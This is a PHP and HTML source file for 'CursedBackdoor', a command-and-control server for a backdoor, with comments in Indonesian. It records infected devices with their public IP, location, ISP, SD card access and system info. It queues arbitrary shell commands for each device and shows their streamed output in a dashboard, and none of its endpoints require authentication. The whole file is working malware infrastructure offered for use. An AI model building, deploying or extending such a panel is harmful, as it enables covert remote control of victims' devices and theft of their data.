<?php
// ============================================================
// BACKEND PHP
// ============================================================
$DATA_FILE = __DIR__ . '/data.json';

function loadData($file) {
    if (!file_exists($file)) return ['devices' => [], 'nextId' => 1];
    $fp = fopen($file, 'r');
    flock($fp, LOCK_SH);
    $raw = stream_get_contents($fp);
    flock($fp, LOCK_UN);
    fclose($fp);
    $d = json_decode($raw, true);
    return is_array($d) ? $d : ['devices' => [], 'nextId' => 1];
}

function saveData($file, $data) {
    $fp = fopen($file, 'c+');
    flock($fp, LOCK_EX);
    ftruncate($fp, 0);
    rewind($fp);
    fwrite($fp, json_encode($data, JSON_PRETTY_PRINT));
    fflush($fp);
    flock($fp, LOCK_UN);
    fclose($fp);
}

$action = $_GET['action'] ?? '';

if ($action !== '') {
    header('Content-Type: application/json');
    $data = loadData($DATA_FILE);

    // ---------- REGISTER (persistent pakai UUID) ----------
    if ($action === 'register') {
        $body = json_decode(file_get_contents('php://input'), true) ?: [];
        $uuid = $body['uuid'] ?? null;
        if (!$uuid) { echo json_encode(['ok'=>false,'error'=>'no uuid']); exit; }

        // Cari device lama dengan UUID sama
        $foundId = null;
        foreach ($data['devices'] as $did => $dev) {
            if (($dev['uuid'] ?? null) === $uuid) { $foundId = $did; break; }
        }

        if ($foundId !== null) {
            // Reuse device lama
            $id = $foundId;
            $data['devices'][$id]['lastSeen'] = time();
            $data['devices'][$id]['connected'] = true;
            $data['devices'][$id]['publicIp'] = $body['publicIp'] ?? $data['devices'][$id]['publicIp'];
            $data['devices'][$id]['geo']      = $body['geo']      ?? $data['devices'][$id]['geo'];
            $data['devices'][$id]['sd']       = $body['sd']       ?? $data['devices'][$id]['sd'];
            $data['devices'][$id]['sysinfo']  = $body['sysinfo']  ?? $data['devices'][$id]['sysinfo'];
            // Queue dibersihin biar command lama ga nge-stack
            $data['devices'][$id]['queue'] = [];
        } else {
            // Device baru
            $id = $data['nextId']++;
            $data['devices'][$id] = [
                'id'        => $id,
                'uuid'      => $uuid,
                'name'      => 'device-' . $id,
                'lastSeen'  => time(),
                'connected' => true,
                'publicIp'  => $body['publicIp'] ?? null,
                'geo'       => $body['geo'] ?? null,
                'sd'        => $body['sd'] ?? null,
                'sysinfo'   => $body['sysinfo'] ?? null,
                'queue'     => [],
                'output'    => [],
            ];
        }
        saveData($DATA_FILE, $data);
        echo json_encode(['ok' => true, 'id' => $id]);
        exit;
    }

    // ---------- DISCONNECT ----------
    if ($action === 'disconnect') {
        $body = json_decode(file_get_contents('php://input'), true);
        $id = (int)($body['id'] ?? 0);
        if (isset($data['devices'][$id])) {
            $data['devices'][$id]['connected'] = false;
            $data['devices'][$id]['lastSeen'] = 0;
            $data['devices'][$id]['queue'] = [];
            saveData($DATA_FILE, $data);
        }
        echo json_encode(['ok' => true]);
        exit;
    }

    // ---------- PULL (heartbeat + command) ----------
    if ($action === 'pull') {
        $id = (int)($_GET['id'] ?? 0);
        if (!isset($data['devices'][$id])) { echo json_encode(['ok'=>false]); exit; }
        $data['devices'][$id]['lastSeen'] = time();
        $data['devices'][$id]['connected'] = true;
        $cmds = $data['devices'][$id]['queue'];
        $data['devices'][$id]['queue'] = [];
        saveData($DATA_FILE, $data);
        echo json_encode(['ok' => true, 'commands' => $cmds]);
        exit;
    }

    // ---------- OUTPUT ----------
    if ($action === 'output') {
        $body = json_decode(file_get_contents('php://input'), true);
        $id = (int)($body['id'] ?? 0);
        if (!isset($data['devices'][$id])) { echo json_encode(['ok'=>false]); exit; }
        $data['devices'][$id]['output'][] = [
            'cmd'    => $body['cmd'] ?? '',
            'result' => $body['result'] ?? '',
            'ts'     => time(),
        ];
        if (count($data['devices'][$id]['output']) > 100) {
            $data['devices'][$id]['output'] = array_slice($data['devices'][$id]['output'], -100);
        }
        saveData($DATA_FILE, $data);
        echo json_encode(['ok' => true]);
        exit;
    }

    // ---------- PUSH (dari dashboard) ----------
    if ($action === 'push') {
        $body = json_decode(file_get_contents('php://input'), true);
        $id  = (int)($body['id'] ?? 0);
        $cmd = trim($body['cmd'] ?? '');
        if (!isset($data['devices'][$id]) || $cmd === '') {
            echo json_encode(['ok'=>false]); exit;
        }
        $data['devices'][$id]['queue'][] = $cmd;
        saveData($DATA_FILE, $data);
        echo json_encode(['ok' => true]);
        exit;
    }

    // ---------- START (stream begin) ----------
    if ($action === 'start') {
        $body = json_decode(file_get_contents('php://input'), true) ?: [];
        $id  = (int)($body['id'] ?? 0);
        $cmd = trim($body['cmd'] ?? '');
        if (!isset($data['devices'][$id]) || $cmd === '') {
            echo json_encode(['ok'=>false]); exit;
        }
        $data['devices'][$id]['output'][] = [
            'cmd'     => $cmd,
            'result'  => '',
            'ts'      => time(),
            'running' => true,
        ];
        if (count($data['devices'][$id]['output']) > 100) {
            $data['devices'][$id]['output'] = array_slice($data['devices'][$id]['output'], -100);
        }
        $data['devices'][$id]['lastSeen'] = time();
        saveData($DATA_FILE, $data);
        echo json_encode(['ok' => true]);
        exit;
    }
    
    // ---------- CHUNK (stream data live) ----------
    if ($action === 'chunk') {
        $body  = json_decode(file_get_contents('php://input'), true) ?: [];
        $id    = (int)($body['id'] ?? 0);
        $chunk = (string)($body['chunk'] ?? '');
        if (!isset($data['devices'][$id])) { echo json_encode(['ok'=>false]); exit; }
        $n = count($data['devices'][$id]['output']);
        if ($n > 0 && !empty($data['devices'][$id]['output'][$n-1]['running'])) {
            $data['devices'][$id]['output'][$n-1]['result'] .= $chunk;
        }
        $data['devices'][$id]['lastSeen'] = time();
        saveData($DATA_FILE, $data);
        echo json_encode(['ok' => true]);
        exit;
    }
    
    // ---------- DONE (stream end) ----------
    if ($action === 'done') {
        $body = json_decode(file_get_contents('php://input'), true) ?: [];
        $id   = (int)($body['id'] ?? 0);
        if (!isset($data['devices'][$id])) { echo json_encode(['ok'=>false]); exit; }
        $n = count($data['devices'][$id]['output']);
        if ($n > 0) {
            $data['devices'][$id]['output'][$n-1]['running'] = false;
        }
        $data['devices'][$id]['lastSeen'] = time();
        saveData($DATA_FILE, $data);
        echo json_encode(['ok' => true]);
        exit;
    }

    // ---------- SYSINFO ----------
    if ($action === 'sysinfo') {
        $body = json_decode(file_get_contents('php://input'), true);
        $id = (int)($body['id'] ?? 0);
        if (!isset($data['devices'][$id])) { echo json_encode(['ok'=>false]); exit; }
        $data['devices'][$id]['sysinfo'] = $body['sysinfo'] ?? null;
        $data['devices'][$id]['lastSeen'] = time();
        saveData($DATA_FILE, $data);
        echo json_encode(['ok' => true]);
        exit;
    }

    // ---------- STATE ----------
    if ($action === 'state') {
        $now = time();
        foreach ($data['devices'] as &$d) {
            // Online = connected && heartbeat < 10s
            $d['online'] = !empty($d['connected']) && ($now - $d['lastSeen']) < 10;
        }
        unset($d);
        echo json_encode(['ok' => true, 'devices' => array_values($data['devices'])]);
        exit;
    }

    echo json_encode(['ok' => false, 'error' => 'unknown action']);
    exit;
}
// ============================================================
// FRONTEND
// ============================================================
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Curseds</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    overflow: hidden;
    font-family: 'Segoe UI', system-ui, sans-serif;
    background: #000000;
    color: #f0f0f0;
  }

  /* ============ NAVBAR ============ */
  .navbar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    height: 48px;
    padding: 0 16px;
    border-bottom: 2px solid #ff0000;
    background: #transparent;
  }
  .navbar .brand {
    font-weight: 700;
    font-size: 18px;
    color: #ff0000;
    letter-spacing: 2px;
  }
  .navbar .menu { display: flex; gap: 18px; }
  .navbar .menu a {
    color: #f0f0f0;
    text-decoration: none;
    font-size: 13px;
    padding: 4px 0;
    border-bottom: 1px solid transparent;
  }
  .navbar .menu a:hover { color: #ff0000; }
  .navbar .menu a.active {
    color: #ff0000;
    border-bottom: 2px solid #ff0000;
  }

  /* ============ LAYOUT ============ */
  .layout {
    display: flex;
    height: calc(100vh - 48px);
    padding: 12px 12px 50px 12px;   /* margin bawah 50px */
    gap: 12px;
    overflow: hidden;
    align-items: stretch;
  }

  /* ============ PANEL KIRI ============ */
  .sidebar {
    width: 220px;
    border: 2px solid #ff0000;
    border-radius: 4px;
    padding: 12px;
    overflow-y: auto;
    overflow-x: hidden;
    background: #transparent;
    flex-shrink: 0;
    height: 75%;   /* biar ga beleber */
  }
  .sidebar h2 {
    font-size: 12px;
    color: #ff0000;
    margin-bottom: 10px;
    text-transform: uppercase;
    letter-spacing: 1px;
  }
  .dev-item {
    border: 2px solid #ff0000;
    padding: 8px 10px;
    margin-bottom: 8px;
    cursor: pointer;
    font-size: 12px;
    border-radius: 4px;
    background: #transparent;
  }
  .dev-item:hover { background: #3a2020; }
  .dev-item.active { background: #4a1818; }
  .dev-item .dname {
    font-weight: 600;
    color: #f0f0f0;
    display: flex;
    align-items: center;
    gap: 6px;
  }
  .dev-item .dip {
    font-size: 11px;
    color: #aaaaaa;
    margin-top: 2px;
    font-family: monospace;
  }
  .dot {
    width: 8px; height: 8px; border-radius: 50%;
    background: #666666; display: inline-block;
  }
  .dot.online { background: #ff0000; }

  /* ============ PANEL KANAN ============ */
  .main {
    flex: 1;
    overflow-y: auto;
    overflow-x: hidden;
    display: flex;
    flex-direction: column;
    gap: 10px;
    min-width: 0;
    height: 100%;
    padding-right: 4px;
  }

  .terminal-out {
    border: 2px solid #ff0000;
    border-radius: 4px;
    background: url('/walp/bgout.jpg');
    background-size: cover;
    background-attachmend: fixed;
    background-position: center center;
    background-repeat: no-repeat!
    color: #ff0000;
    font-family: 'Consolas', monospace;
    font-size: 12px;
    padding: 10px;
    height: 840px;
    overflow-y: auto;
    white-space: pre-wrap;
    word-break: break-all;
    line-height: 1.5;
    flex-shrink: 0;
  }
  .terminal-out .cmd { color: #ff0000; font-weight: 700; }
  .terminal-out .out { color: #fff; }
  .terminal-out .empty { color: #ff0000; opacity: 0.6; font-style: italic; }

  .input-bar {
    display: flex;
    gap: 8px;
    align-items: flex-start;
    flex-shrink: 0;
  }
  .input-bar textarea {
    flex: 1;
    border: 2px solid #ff0000;
    border-radius: 4px;
    padding: 8px 10px;
    font-family: 'Consolas', monospace;
    font-size: 12px;
    color: #ff0000;
    background: #000;
    resize: none;
    min-height: 40px;
    max-height: 80px;
    outline: none;
  }
  .input-bar textarea::placeholder { color: #fff; opacity: 0.5; }
  .input-bar button {
    border: 2px solid #ff0000;
    background: #1a1a1a;
    color: #ff0000;
    padding: 8px 18px;
    font-weight: 700;
    font-size: 13px;
    cursor: pointer;
    border-radius: 4px;
    height: 40px;
  }
  .input-bar button:hover { background: #4a1818; }

  .bottom-row {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
    flex-shrink: 0;
  }
  .box {
    border: 2px solid #ff0000;
    border-radius: 4px;
    padding: 10px;
    background: #transparent;
  }
  .box h3 {
    font-size: 11px;
    color: #ff0000;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 8px;
  }
  .info-row {
    display: flex;
    justify-content: space-between;
    font-size: 11px;
    padding: 3px 0;
    border-bottom: 1px dotted #5a3030;
  }
  .info-row:last-child { border-bottom: none; }
  .info-row .k { color: #aaaaaa; }
  .info-row .v { color: #f0f0f0; font-family: monospace; font-weight: 600; }
  .info-row .v.red { color: #ff0000; }

  canvas.cpu-graph {
    width: 100%;
    height: 90px;
    display: block;
  }

  .empty-state {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #ff0000;
    opacity: 0.6;
    font-size: 14px;
    border: 1px dashed #ff0000;
    border-radius: 4px;
  }

  ::-webkit-scrollbar { width: 6px; height: 6px; }
  ::-webkit-scrollbar-track { background: #transparent; }
  ::-webkit-scrollbar-thumb { background: gray; border-radius: 2px; }
</style>
</head>
<body>

<nav class="navbar">
  <div class="brand">CursedBackdoor - by Tanaka</div>
  <div class="menu">
    <a href="api.php" class="active">Dashboard</a>
    <a href="#">Credits</a>
    <a href="#">Channels</a>
    <a href="#">About</a>
  </div>
</nav>

<div class="layout">
  <aside class="sidebar">
    <h2>Controll Devices</h2>
    <div id="device-list"></div>
  </aside>

  <main class="main" id="main-panel">
    <div class="empty-state">Pilih device di panel kiri 👈</div>
  </main>
</div>

<script>
let devices = [];
let activeId = null;
const cpuHistory = {};

function renderSidebar() {
  const list = document.getElementById('device-list');
  if (devices.length === 0) {
    list.innerHTML = '<div style="font-size:11px;color:#ff0000;opacity:0.6;font-style:italic;">Belum ada device...</div>';
    return;
  }
  list.innerHTML = devices.map(d => `
    <div class="dev-item ${d.id === activeId ? 'active' : ''}" onclick="selectDevice(${d.id})">
      <div class="dname">
        <span class="dot ${d.online ? 'online' : ''}"></span>
        ${escapeHtml(d.name)}
      </div>
      <div class="dip">${d.publicIp ? escapeHtml(d.publicIp) : 'no ip'}</div>
    </div>
  `).join('');
}

function selectDevice(id) {
  activeId = id;
  renderSidebar();
  renderMain();
}

function renderMain() {
  const main = document.getElementById('main-panel');
  const d = devices.find(x => x.id === activeId);

  if (!d) {
    main.innerHTML = '<div class="empty-state"></div>';
    main.dataset.deviceId = '';
    return;
  }

  if (main.dataset.deviceId == String(d.id)) {
    updateDynamic(d);
    return;
  }

  main.dataset.deviceId = d.id;
  main.innerHTML = `
    <div class="terminal-out" id="term-out">
      <span class="empty">~ $ waiting command...</span>
    </div>
    <div class="input-bar">
      <textarea id="cmd-input" placeholder="Send Command, Ex: echo 'Hello Worlds'"></textarea>
      <button onclick="sendCmd()">Remote</button>
    </div>
    <div class="bottom-row">
      <div class="box">
        <h3>CPU Usages</h3>
        <canvas class="cpu-graph" id="cpu-canvas"></canvas>
      </div>
      <div class="box">
        <h3>Device Information</h3>
        <div id="info-box"></div>
      </div>
    </div>
  `;

  const ta = document.getElementById('cmd-input');
  ta.addEventListener('keydown', e => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      sendCmd();
    }
  });

  updateDynamic(d);
}

function updateDynamic(d) {
  const term = document.getElementById('term-out');
  if (term) {
    if (d.output.length === 0) {
      term.innerHTML = '<span class="empty">$ menunggu command...</span>';
    } else {
      term.innerHTML = d.output.map(o =>
        `<span class="cmd">$ ${escapeHtml(o.cmd)}</span>\n<span class="out">${escapeHtml(o.result)}</span>\n`
      ).join('');
    }
    // term.scrollTop = term.scrollHeight;
  }

  const info = document.getElementById('info-box');
  if (info) {
    const geo = d.geo || {};
    const sd = d.sd || {};
    const sys = d.sysinfo || {};
    const sdText = sd.writable ? 'Read and Write' : sd.readable ? 'RO 📖' : 'No Access';
    const loc = geo.city && geo.country ? `${geo.city}, ${geo.country}` : '-';

    info.innerHTML = `
      <div class="info-row"><span class="k">IP Public</span><span class="v white">${escapeHtml(d.publicIp || '-')}</span></div>
      <div class="info-row"><span class="k">Lokasi</span><span class="v">${escapeHtml(loc)}</span></div>
      <div class="info-row"><span class="k">ISP</span><span class="v">${escapeHtml(geo.isp || '-')}</span></div>
      <div class="info-row"><span class="k">SD Card</span><span class="v ${sd.writable ? 'green' : ''}">${sdText}</span></div>
      <div class="info-row"><span class="k">SD Path</span><span class="v">${escapeHtml(sd.path || '-')}</span></div>
      <div class="info-row"><span class="k">Platform</span><span class="v">${escapeHtml(sys.platform || '-')}</span></div>
      <div class="info-row"><span class="k">Status</span><span class="v ${d.online ? '#00FF00' : ''}">${d.online ? 'ONLINE' : 'OFFLINE'}</span></div>
    `;
  }

  drawCpuGraph(d);
}

function drawCpuGraph(d) {
  const canvas = document.getElementById('cpu-canvas');
  if (!canvas) return;

  if (!cpuHistory[d.id]) cpuHistory[d.id] = [];
  const cpuVal = d.sysinfo && typeof d.sysinfo.cpu === 'number' ? d.sysinfo.cpu : null;
  if (cpuVal !== null) {
    const hist = cpuHistory[d.id];
    // cuma push kalau beda (biar ga numpuk duplikat saat polling)
    if (hist.length === 0 || hist[hist.length - 1] !== cpuVal) {
      hist.push(cpuVal);
      if (hist.length > 60) hist.shift();
    }
  }

  const hist = cpuHistory[d.id];
  const dpr = window.devicePixelRatio || 1;
  const rect = canvas.getBoundingClientRect();
  canvas.width = rect.width * dpr;
  canvas.height = rect.height * dpr;
  const ctx = canvas.getContext('2d');
  ctx.scale(dpr, dpr);

  const W = rect.width, H = rect.height;
  const pad = 6;

  ctx.strokeStyle = '#5a3030';
  ctx.lineWidth = 1;
  for (let i = 1; i <= 3; i++) {
    const y = pad + (H - 2*pad) * (i / 4);
    ctx.beginPath();
    ctx.moveTo(pad, y);
    ctx.lineTo(W - pad, y);
    ctx.stroke();
  }

  if (hist.length < 2) {
    ctx.fillStyle = '#ff0000';
    ctx.font = '11px monospace';
    ctx.fillText('menunggu data...', pad + 4, H/2);
    return;
  }

  ctx.strokeStyle = '#ff0000';
  ctx.lineWidth = 1.5;
  ctx.beginPath();
  const stepX = (W - 2*pad) / (hist.length - 1);
  hist.forEach((v, i) => {
    const x = pad + i * stepX;
    const y = H - pad - (v / 100) * (H - 2*pad);
    if (i === 0) ctx.moveTo(x, y);
    else ctx.lineTo(x, y);
  });
  ctx.stroke();

  ctx.fillStyle = '#ff0000';
  ctx.font = '10px monospace';
  const last = hist[hist.length - 1];
  ctx.fillText(`${last.toFixed(0)}%`, W - 36, 14);
}

async function sendCmd() {
  if (!activeId) return;
  const ta = document.getElementById('cmd-input');
  const cmd = ta.value.trim();
  if (!cmd) return;
  ta.value = '';
  await fetch('?action=push', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ id: activeId, cmd })
  });
  poll();
}

async function poll() {
  try {
    const r = await fetch('?action=state');
    const j = await r.json();
    if (!j.ok) return;

    devices = j.devices;

    if (activeId === null && devices.length > 0) {
      activeId = devices[0].id;
    }
    if (activeId !== null && !devices.find(x => x.id === activeId)) {
      activeId = devices.length > 0 ? devices[0].id : null;
      document.getElementById('main-panel').dataset.deviceId = '';
    }

    renderSidebar();
    renderMain();
  } catch(e) {}
}

function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

poll();
setInterval(poll,0);
window.addEventListener('resize', () => {
  const d = devices.find(x => x.id === activeId);
  if (d) drawCpuGraph(d);
});
</script>
</body>
</html>
